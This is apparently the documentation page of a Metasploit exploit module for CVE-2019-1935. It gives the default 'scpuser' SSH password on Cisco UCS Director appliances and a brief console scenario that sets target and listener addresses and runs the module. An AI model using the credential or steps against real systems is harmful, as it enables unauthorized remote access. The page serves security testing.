## Vulnerable Application

This module abuses a known default password on Cisco UCS Director. The 'scpuser'
has the password of 'scpuser', and allows an attacker to login to the virtual appliance
via SSH (aka CVE-2019-1935).

This module has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.
Note that Cisco also mentions in their advisory that their IMC Supervisor and
UCS Director Express are also affected by these vulnerabilities, but this module
was not tested with those products.

## Scenarios

Setup RHOST and run it!

rhost => 10.9.8.121
msf5 exploit(linux/ssh/cisco_ucs_scpuser) > set lhost 10.9.8.1
lhost => 10.9.8.1
msf5 exploit(linux/ssh/cisco_ucs_scpuser) > run
